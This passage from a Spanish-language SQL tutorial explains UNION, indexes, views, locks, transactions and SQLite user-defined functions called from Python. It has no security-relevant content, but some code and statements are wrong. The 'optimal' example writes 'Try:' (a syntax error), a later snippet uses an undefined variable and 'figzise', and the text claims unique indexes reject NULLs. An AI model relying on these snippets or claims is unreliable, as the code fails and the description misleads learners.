&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab19.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como resultado si lo aplicamos a  nuestros &lt;code&gt;JOINS&lt;/code&gt;, nos devulve mas datos, donde podemos ver que estos se duplican.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query85.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En conclusión podriamos inferir que al combinar con &lt;code&gt;UNION&lt;/code&gt; nos elimina las filas duplicadas y al usar &lt;code&gt;UNION ALL&lt;/code&gt; de existir filas duplicadas las muestra.&lt;/p&gt;

&lt;h2 id=&quot;indices&quot;&gt;INDICES &lt;a href=&quot;#indices&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Los indices en &lt;code&gt;SQL&lt;/code&gt; vienen a ser una estructura de datos que mejoran la velocidad de la consultas y las operaciones de busquedas en un tabla. En terminos mas simples un indice nos permite acceder rapidamente a los registros de una tabla en función de los valores de una o mas columnas, de esta manera nuestras busquedas son mas eficientes.&lt;/p&gt;

&lt;h2 id=&quot;indices-ordinarios-index&quot;&gt;INDICES ORDINARIOS - INDEX &lt;a href=&quot;#indices-ordinarios-index&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Los indices ordinarios o no unicos, crean indices que se pueden duplicar y ademas permiten incluir valores nulos. Solo usa el indice para buscar mas rapido pero obvia si existen o no duplicados.&lt;/p&gt;

&lt;p&gt;Para crear un indice debemos usar &lt;code&gt;CREATE INDEX&lt;/code&gt; y seguido el nombre a asignar, depues con &lt;code&gt;ON&lt;/code&gt; especificaremos de que tabla queremos crear el indice y finalmente entre &lt;code&gt;()&lt;/code&gt; debemos espeficar el campo especifico sobre el cual lo aplicaremos.&lt;/p&gt;

&lt;p&gt;En este caso primero ejecutaremos una consulta que nos muestre todo de la tabla clientes &lt;code&gt;Customers&lt;/code&gt;, donde el &lt;code&gt;ContactName&lt;/code&gt; corresponda al de &lt;code&gt;Hanna Moos&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query86.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podemos observar que nuestra consulta se ejecuta en un periodo de &lt;code&gt;5ms&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Lo siguiente que haremos es crear un indice en el campo &lt;code&gt;ContactName&lt;/code&gt; de la tabla &lt;code&gt;Customers&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query87.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora si volvemos a ejecutar la consulta anterior, observamos que la consulta esta vez solo tarda &lt;code&gt;1ms&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query88.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Esto no puede parecer notorio a consultas en una escala baja, pero de esta manera los &lt;code&gt;INDICES&lt;/code&gt; nos dan una solución con la que podemos alivianar bastante el tiempo de consultas que son muy pesadas.&lt;/p&gt;

&lt;h2 id=&quot;indices-primarios-primary-keys&quot;&gt;INDICES PRIMARIOS - PRIMARY KEYS &lt;a href=&quot;#indices-primarios-primary-keys&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Los indices primarios, son los ya mencionados &lt;code&gt;PRIMARY KEYS&lt;/code&gt;, estos tienen como finalidad el permitirnos identidicar las filas de manera unica.&lt;/p&gt;

&lt;p&gt;En este caso puntual si seleccionamos los datos de la tabla &lt;code&gt;Customers&lt;/code&gt;, los indices primarios serian los valores correspondientes al &lt;code&gt;CustomerID&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query90.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;indices-unicos-unique-index&quot;&gt;INDICES UNICOS - UNIQUE INDEX &lt;a href=&quot;#indices-unicos-unique-index&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Este tipo de indice garantiza que los valores de una columna sean unicos en una tabla, esto implica que no puede haber duplicados en la columna y por ello al crearlos, ademas de mejorar el rendimiento de nuestras consultas verifica que no existan duplicados ni tampoco valores nulos. Puede aplicarse a uno o varios campos.&lt;/p&gt;

&lt;p&gt;Para crear este tipo de indice es similar al ordinario, solo que debemos de agregar la palabra &lt;code&gt;UNIQUE&lt;/code&gt; y lo vamos a crear en nuestra tabla &lt;code&gt;Employees&lt;/code&gt; especificamente en los campos &lt;code&gt;Firtsname&lt;/code&gt; y &lt;code&gt;Lastname&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query89.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;De esta manera lo que vamos a conseguir es que no se permita crear dos registros que tengan el mismo nombre &lt;code&gt;Firtsname&lt;/code&gt;y apellido &lt;code&gt;Lastname&lt;/code&gt;. En tal sentido podemos crear registros que tengan distintos nombres y apellidos, pero si tratamos de insertar el mismo nombre y el mismo apellido, logicamente ya que dos personas no pueden tener los mismos datos correspondientes funciona como una especie de validación.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query91.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Concluimos que con este tipo de indice ademas que podemos tener un mejor rendimiento en nuestras consultas, tambien nos aseguramos de que no puedan existir valores duplicados. Si lo vemos practicamente en terminos reales es como cuando tratamos de registrarnos con un nombre de usuario y si este ya existe el sistema nos arroja un error, donde nos exige que intentemos con otros nombre de usuario.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Los indices consumen mucho espacio en disco, por ello si creamos demasiados indices podemos generar un impacto negativo, ademas que cuando se hace operaciones de alteracion de una tabla tambien se actualizan los indices y esto relentiza las operaciones de escritura. Por ello debemos de usar indices solo cuando sean necesarios, recomendablemente en consultas que realizamos constantemente o cuando tienen una alta cardinalidad en otras palabras cuando estemos trabajando con muchos indices.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Una ultima cosa es que si queremos borrar los indices, debemos usar &lt;code&gt;DROP INDEX&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query92.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;vistas&quot;&gt;VISTAS &lt;a href=&quot;#vistas&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Una &lt;code&gt;vista&lt;/code&gt; es una representacio virtual de una tabla o de una combinación de tablas, por ello podemos pensar en las vistas como una especie de tabla virtual, estas ademas nos permiten simplificar las consultas especialmente cuando son muy complejas y trabajar sobre estas.&lt;/p&gt;

&lt;p&gt;Supongamos que queremos trabajar sobre la tabla de clientes &lt;code&gt;Customers&lt;/code&gt;, solo si estos son de la ciudad de &lt;code&gt;Madrid&lt;/code&gt; o del pais de &lt;code&gt;España&lt;/code&gt;, para ello tendriamos que realizar el filtro.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query93.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora si nosostros quisieramos trabajar unicamente con estos datos, tendriamos que aplicar condicionales, joins o entre otras a esta misma consulta.&lt;/p&gt;

&lt;p&gt;Pero lo que podemos hacer seria crear una &lt;code&gt;vista&lt;/code&gt;, esto lo hacemos con &lt;code&gt;CREATE VIEW&lt;/code&gt; mas el nombre de la vista que le queremos dar y seguidamente usamos &lt;code&gt;AS&lt;/code&gt; para luego haces referencia a sobre que tabla crear nuestra vista. En este caso sobre el resultado de nuestra consulta anterior.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query94.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que ahora cambia de color, ya que ahora se almaceno como vista, y en consecuencia podemos trabajar directamente sobre ella como si fuera una tabla.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query95.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora seguro puedes pensar que podemos usarlas todo el timpo y simplificarnos las tareas…&lt;/p&gt;

&lt;p&gt;Pues no siempre por que debemos recordar que al ejecutar la vista, por detras se sigue ejecutando la consulta que la genero, por lo tanto realiza un consumo en disco y si lo aplicamos muchas veces tambien nos dara un problema de rendimiento.&lt;/p&gt;

&lt;p&gt;Pero nos puede servir muchas ocasiones ya que nos simplifica el estar haciendo la misma consulta para un proposito, lo unico es que si las vamos a utilizar procuremos hacerlo de manera equilibrada.&lt;/p&gt;

&lt;p&gt;Y una cosa mas para borrar una &lt;code&gt;vista&lt;/code&gt;, debemos ejecutar &lt;code&gt;DROP VIEW&lt;/code&gt; y el nombre de la vista.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query96.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;pero aqui una observación y es que si ejecutamos el comando nuevamente nos devuelve un error.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query97.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Por ello igualmente que cuando creamos una tabla se recomienda usar el &lt;code&gt;IF EXISTS&lt;/code&gt; y de este modo verifica que la vista exista antes de borrarla.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query98.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;de esta forma ya no nos muestra el error.&lt;/p&gt;

&lt;h2 id=&quot;bloqueos&quot;&gt;BLOQUEOS &lt;a href=&quot;#bloqueos&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Los bloqueos son los mecanismos de la bae de datos, que se utilizan para para controlar el acceso concurrente a la base de datos. Esto para evitar que en el proceso se realizen cambios conflictivos o se acceda al mismo tiempo a los datos.&lt;/p&gt;

&lt;p&gt;Supongamos tenemos &lt;code&gt;$500&lt;/code&gt; dolares en nuestra cuenta bancaria, pero que pasaria si desde los lugares hacemos un retiro al mismo tiempo, pues lo que sucederia es que nuestra cuenta se quedaria con un valor negativo de &lt;code&gt;-$500&lt;/code&gt; y en vista que eso no puede suceder para ello es que suceden estos mecanismo de bloqueo.&lt;/p&gt;

&lt;p&gt;Existen dos tipos de bloqueos:&lt;/p&gt;

&lt;h2 id=&quot;bloqueos-compartidos-shared-locks&quot;&gt;BLOQUEOS COMPARTIDOS - SHARED LOCKS &lt;a href=&quot;#bloqueos-compartidos-shared-locks&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;En este tipo de bloqueo nadie de los usuarios puede escribir, pero si pueden leer. En sintesis cuando nosotros estamos leyendo la base de datos ninguna de las otras conexiones puede escribir, pero si pueden leer.&lt;/p&gt;

&lt;h2 id=&quot;bloqueos-reservados-reserved-locks&quot;&gt;BLOQUEOS RESERVADOS - RESERVED LOCKS &lt;a href=&quot;#bloqueos-reservados-reserved-locks&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Es este tipo de bloqueo se aplica cuando estamos escribiendo en la base de datos y en ese momento las otras conexiones no pueden escribir pero si pueden leer.&lt;/p&gt;

&lt;h2 id=&quot;bloqueos-exclusivos-exclusive-locks&quot;&gt;BLOQUEOS EXCLUSIVOS - EXCLUSIVE LOCKS &lt;a href=&quot;#bloqueos-exclusivos-exclusive-locks&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;En este tipo de bloqueos se da cuando mientras estamos escribiendo, las demas conexiones no puedan leer y tampoco puedan escribir, o en un caso mas especifico podemos manipularnos segun nos convenga.&lt;/p&gt;

&lt;h2 id=&quot;transacciones-begin-transaction&quot;&gt;TRANSACCIONES - BEGIN TRANSACTION &lt;a href=&quot;#transacciones-begin-transaction&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Son una secuencia de operaciones que se consideran como una unidad logica, estas aseguran que todas las operaciones dentro de ellas se completen de manera exitosa o por el contrario se deshagan en caso de erro.&lt;/p&gt;

&lt;p&gt;Para iniciar una nueva transaccion usamos &lt;code&gt;BEGIN TRANSACTION&lt;/code&gt; o solo &lt;code&gt;BEGIN&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Despues podemos hacer la alteración que queramos en las tablas de la base de datos, por ejemplo puedo cambiar el nombre a un producto, en este caso a &lt;code&gt;Chang&lt;/code&gt; y renombrarlo como &lt;code&gt;Refrescos&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Como son consultas separadas debemos hay que separarlas con un &lt;code&gt;;&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query99.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Despues de ejecutar la consulta y visualizamos que se cambia el nombre del producto.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query100.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Es aqui donde entran a las transacciones ya que si bien realizamos el cambio, tenemos dos opciones la primera es que si estamos seguros de guardar los cambios ejecutemos &lt;code&gt;COMMIT&lt;/code&gt;, pero en caso de existir un error y queramos volver a la acción anterior y no se efectuen &lt;code&gt;ROLLBACK&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Primero ejecutamos &lt;code&gt;COMMIT&lt;/code&gt;,  de esta manera se efectuan los cambios.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query101.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora supongamos que por error modificamos los nombres de todos los productos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query102.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Verificamos y efectivamente se realizaron los cambios.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query103.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podriamos pensar que hemos arruinado nuestra base de datos, pero ya que iniciamos una transacción, como mencionaba anteriormente con &lt;code&gt;ROLLBACK&lt;/code&gt;, podemos restaurar los cambios, de modo tal que estos no se guarden.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query104.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y de esta manera ya tenemos claro primero debemos iniciar una transacción con &lt;code&gt;BEGIN&lt;/code&gt;, y una vez se haaya iniciado podemos ejecutar la consulta que queramos de modo tal que si despues queremos guardar los cambio ejecutar un &lt;code&gt;COMMIT&lt;/code&gt;, y si de lo contrario queremos resturarlos usamos &lt;code&gt;ROLLBACK&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;procedimientos-almacenados&quot;&gt;PROCEDIMIENTOS ALMACENADOS &lt;a href=&quot;#procedimientos-almacenados&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Es un conjunto de instrucciones que se almancenan en la base de datos y que podemos ejecutarlos cuando queramos para reducir la repetición del codigo, mejora la seguridad por que se limita el acceso directo a la base de datos y aumenta el rendimiento ya que estas operaciones se ejecutan en el servidor de la propia base de datos.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;sqlite3&lt;/code&gt; se caracteriza por ser ligero de y facil implementación ya ejecuta como una biblioteca y por lo tanto no soporta procedimientos almacenados por que en principio no los necesita ya que se integra directamente en la aplicación que lo utiliza lo que facilita su portabilidad y en consecuencia es sencillo implementarlo en distintas plataformas y sistemas operativos.&lt;/p&gt;

&lt;p&gt;Por lo tanto cuando queremos ejecutar procedimientos almacenados con &lt;code&gt;sqlite3&lt;/code&gt; lo hacemos desde el backend o lenguaje anfitrion a nivel de aplicación, usando las funciones del lenguaje y aunque estas funciones que podamos definir no son iguales a las de los procedimientos almacenados viene a ser la solución a este problema.&lt;/p&gt;

&lt;h2 id=&quot;sql-y-python&quot;&gt;SQL Y PYTHON &lt;a href=&quot;#sql-y-python&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Como mencionamos anteriormente en el apartado anterior necesitamos de un lenguaje para ejecutar nuestras funciones definidas por el usuario y para ello usaremos nada mas y nada menos que &lt;code&gt;Python&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;funciones-definidas-por-el-usuario&quot;&gt;FUNCIONES DEFINIDAS POR EL USUARIO - USER DEFINED FUNCTIONS &lt;a href=&quot;#funciones-definidas-por-el-usuario&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Son funciones que podemos crear y utilizar dentro de nuestras consultas &lt;code&gt;SQL&lt;/code&gt;. Estas funciones permiten ampliar las funcionalidades de &lt;code&gt;SQLite&lt;/code&gt; realizando calculos o manipulaciones de datos especificos que no estas directamente disponibles en las funciones integradas.&lt;/p&gt;

&lt;p&gt;Y para ello para definir estas funciones utilizaremos &lt;code&gt;Python&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Comenzaremos importando la libreria de &lt;code&gt;SQLite&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import sqlite3
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Despues crearemos una función, en este caso una que nos devuelva el 20% de un valor que reciba como parametro.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;def calcular_porcentaje(valor):
    porcentaje = valor * 0.20
    return porcentaje
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ya que tenemos nuestra función, ahora procederemos a crear una conexión con nuestra base de datos en este caso &lt;code&gt;Northwind.db&lt;/code&gt; y la guardaremos en la variable &lt;code&gt;conn&lt;/code&gt;. Ojo se debe espeficiar la ruta en donde tengas la db.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;conn = sqlite3.connect(&quot;Northwind.db&quot;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora tenemos que registrar nuestra función en nuestra conexión con&lt;code&gt;SQLite&lt;/code&gt;, para ello usamos el metodo &lt;code&gt;create_function&lt;/code&gt; y como primer parametro especificamos el nombre que tendra la función en &lt;code&gt;SQLite&lt;/code&gt; que puedes llamarla como quieras, en este caso la llamare &lt;code&gt;Porcentaje&lt;/code&gt;, despues como segundo valor debemos espeficar el numero de parametros de nuestra función creada que en este caso es &lt;code&gt;1&lt;/code&gt; y finalmente como tercer parametro nuestra función &lt;code&gt;calcular_porcentaje&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;conn.create_function(&quot;porcentaje&quot;, 1, calcular_porcentaje)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Una vez ya tengamos registrada nuestra función, ahora necesitamos crear es algo que nos permite hacer una consulta a la base de datos y obtener una respuesta con todos los datos ya procesados y para ello en &lt;code&gt;Python&lt;/code&gt;, tenemos algo que se llaman &lt;code&gt;cursores&lt;/code&gt; que nos devolveran los resultados ya formateados.&lt;/p&gt;

&lt;p&gt;Asi que creamos un &lt;code&gt;cursor&lt;/code&gt; y lo guardamos en la variable cursor.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;cursor = conn.cursor()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo siguiente es ejecutar la consulta y eso lo hacemos con &lt;code&gt;cursor.execute&lt;/code&gt; y dentro podemos ejecutar la consulta que queramos, para este caso vamos a hacer una consulta donde vamos a seleccionar el nombre de los productos de la tabla &lt;code&gt;Products&lt;/code&gt;, el precio normal y ademas nuevamente el precio pero en este es donde vamos a ejecutar nuestra función &lt;code&gt;porcentaje&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;cursor.execute('SELECT ProductName, porcentaje(Price) FROM PRODUCTS')
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Los resultados de la consulta vamos a almacenarlos en la variable &lt;code&gt;resultados&lt;/code&gt; y para obtenerlos usaremos el metodo &lt;code&gt;fetchall()&lt;/code&gt; que se utiliza para recuperar todas las filas del conjunto de resultados de una consulta.&lt;/p&gt;

&lt;p&gt;En el caso en el que solo quisieramos recuperar solo una fila, usariamos &lt;code&gt;fetchone()&lt;/code&gt;. Como en este caso queremos el resultado de varias filas usamos &lt;code&gt;fetchall()&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;resultados = cursor.fetchall()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Finalmente cerrar el cursor y la conexión para liberar los recursos usados.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;cursor.close()
conn.close()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y ahora si imprimimos los resultados, nos lo devolvera en crudo, de tal forma que no sera bien legible. Para solucionar este problema usaremos otra libreria de &lt;code&gt;Python&lt;/code&gt; llamada &lt;code&gt;pandas&lt;/code&gt; y con ellas vamos a exportar el resultado en un &lt;code&gt;dataframe&lt;/code&gt; que basicamente nos permitira mostrar la información en una especie de tablas.&lt;/p&gt;

&lt;p&gt;Por lo tanto nuestro codigo completo nos quedaria asi:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import sqlite3
import pandas as pd

def calcular_porcentaje(valor):
    porcentaje = valor * 0.20
    return porcentaje

conn = sqlite3.connect(&quot;Northwind.db&quot;)

conn.create_function(&quot;porcentaje&quot;, 1, calcular_porcentaje)

cursor = conn.cursor()

cursor.execute('SELECT ProductName, Price, porcentaje(Price) FROM PRODUCTS')

resultados = cursor.fetchall()

df_resultados = pd.DataFrame(resultados)

print(df_resultados)

cursor.close()

conn.close()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Al ejecutar nos da como resultado de una majera mas legible los resultados.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query105.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Todo esto que acabamos de hacer es una transacción, ya que estas se inician por el lenguaje anfitrion, tras bambalinas lo que esta haciendo &lt;code&gt;Python&lt;/code&gt; es hacer un &lt;code&gt;BEGIN&lt;/code&gt; automaticamente, entonces una vez que realizamos toda la conexión si queremos que se guarden los cambios hay que usar exacto un &lt;code&gt;COMMIT&lt;/code&gt; y de esta manera hubieramos ejecutado correctamente la conexión.&lt;/p&gt;

&lt;p&gt;Pero existe una manera mas sencilla y optima para hacer exactamente lo mismo, esto nos ayudaria a simplificar nuestro codigo y evitar estar cerrando estas conexiones. Para esto tendriamos que usar &lt;code&gt;with&lt;/code&gt; y manejar los errores con un &lt;code&gt;Try Catch&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Voy a explicar como funciona y por que es mas optimo usar esta opción - aunque en el curso de &lt;code&gt;Python&lt;/code&gt; veremos esto a detalle:&lt;/p&gt;

&lt;p&gt;Bueno principalmente es mas optimo, puesto que cuando usamos &lt;code&gt;with&lt;/code&gt; para conectarnos a la base de datos nos va a garantizar que la conexión se cierre automaticamente al finalizar el bloque de codigo y nos asegura que los recursos de la conexión que establecimos se liberen correctamente aunque ocurran exepciones.&lt;/p&gt;

&lt;p&gt;Pero para estar seguro tambien usaremos un &lt;code&gt;Try Catch&lt;/code&gt;, donde manejaremos las exepciones en el caso pueda existir alguna:&lt;/p&gt;

&lt;p&gt;Como primera exepción usamos &lt;code&gt;sqlite3.Error&lt;/code&gt; que capturara los errores especificos de &lt;code&gt;SQLite&lt;/code&gt; de haberlos y nos mostrara a cual corresponde en pantalla.&lt;/p&gt;

&lt;p&gt;Despues una exepción general con &lt;code&gt;Exception&lt;/code&gt;, si es que el problema no se da necesariamente con &lt;code&gt;SQLite&lt;/code&gt; y de esta manera tambien nos lo reporte al ocurrir.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import sqlite3
import pandas as pd

def calcular_porcentaje(valor):
    porcentaje = valor * 0.20
    return porcentaje

Try:
    with sqlite3.connect(&quot;Northwind.db&quot;) as conn:

        conn.create_function(&quot;porcentaje&quot;, 1, calcular_porcentaje)

        cursor = conn.cursor()

        cursor.execute('SELECT ProductName, Price, porcentaje(Price) FROM PRODUCTS')

        resultados = cursor.fetchall()

        df_resultados = pd.DataFrame(resultados)

        print(df_resultados)

except sqlite3.Error as e:
    print(&quot;Error en la base de datos: &quot;, e)
except Exception as e:
    print(&quot;Error global: &quot;, e)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora para cerrar el cursor, vamos a realizar un ejemplo un poco mas complejo igual desde &lt;code&gt;Python&lt;/code&gt; donde de nuestra base de datos trataremos de obtener los 3 empleados que generaron mas ingresos en general.&lt;/p&gt;

&lt;p&gt;Para ello primero armaremos la estructura de nuestro codigo y importaremos la libreria &lt;code&gt;matplotlib&lt;/code&gt; para visualizarlo los resultados graficamente y esta vez como estamos usando &lt;code&gt;pandas&lt;/code&gt; vamos a usar una función que nos permite leer una consulta &lt;code&gt;SQL&lt;/code&gt; la cual es &lt;code&gt;pd.read_sql_query&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import sqlite3
import pandas as pd
import matplotlib.pyplot as plt

consulta = '''

    
'''
with sqlite3.connect(&quot;Northwind.db&quot;) as conn:

    resultado = pd.read_sql_query(query, conn)

resultado.plot(x=, y=, kind=&quot;bar&quot;, figzise=(10,5), legend=False)
plt.title(&quot;Empleado que genero mas Ingresos&quot;)
plt.xlabel(&quot;Nombre Empleado&quot;)
plt.ylabel(&quot;Monto Total Vendido&quot;)
plt.xticks(rotation=45)
plt.show()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vamos a explicarlo paso a paso:&lt;/p&gt;

&lt;p&gt;Con &lt;code&gt;pd.read_sql_query&lt;/code&gt; que recibe dos parametros, en el primero lo que hacemos es que directamente le pasamos la consulta que queramos ejecutar y como segundo parametro la conexión que esta almancenada en &lt;code&gt;conn&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Despues usamos la libreria &lt;code&gt;matplotlib.pyplot&lt;/code&gt; para crear un &lt;code&gt;plot&lt;/code&gt; que se refiere a crear un grafico, donde con x indicaremos y indicaremos los valores bajo los cuales se creara, que aun no los definimos, despues con &lt;code&gt;kind&lt;/code&gt; indicamos el tipo de grafico que queremos que tenga, en este caso en barras, figzise para indicarle el tamaño que tendra nuestro grafico y despues con &lt;code&gt;legend&lt;/code&gt; si queremos que tenga una leyenda, en este caso no quiero que se vea por ese le pongo &lt;code&gt;false&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Despues con &lt;code&gt;plt.title&lt;/code&gt;, le damos un nombre a nuestra grafica, &lt;code&gt;plt.xlabel&lt;/code&gt; para ponerle un nombre en el eje &lt;code&gt;X&lt;/code&gt; y &lt;code&gt;plt.ylabel&lt;/code&gt; lo mismo para el eje &lt;code&gt;Y&lt;/code&gt;. Despues con &lt;code&gt;xticks&lt;/code&gt; le decimos que el nombre del eje &lt;code&gt;X&lt;/code&gt;, tenga una rotación de 45 grados para que los nombres no salgan uno encima de otro.&lt;/p&gt;

&lt;p&gt;Finalmente con &lt;code&gt;plt.show()&lt;/code&gt; le decimos que nos muestre el grafico.&lt;/p&gt;

&lt;p&gt;Ahora en lo que respecta a nuestra consulta, como queremos seleccionar el empleado que genero mas ingresos, primero vamos a seleccionar los datos del empleado y la suma de la cantidad vendida &lt;code&gt;Quantity&lt;/code&gt; referente a la tabla &lt;code&gt;OrderDetails&lt;/code&gt; por el &lt;code&gt;Precio&lt;/code&gt; correspondiente a la tabla &lt;code&gt;Products&lt;/code&gt; esto de la tabla &lt;code&gt;Employees&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query106.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Despues vamos a aplicar un &lt;code&gt;JOIN&lt;/code&gt; y buscaremos las coincidencias de las tablas partiendo de &lt;code&gt;Employees&lt;/code&gt; hasta la tabla &lt;code&gt;OrderDetails&lt;/code&gt; donde tenemos la cantidad y a su vez hasta la tabla &lt;code&gt;Products&lt;/code&gt; donde tenemos el precio.&lt;/p&gt;

&lt;p&gt;Esto aunque puede parecer complicado lo haremos basandonos en los &lt;code&gt;ID&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query107.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

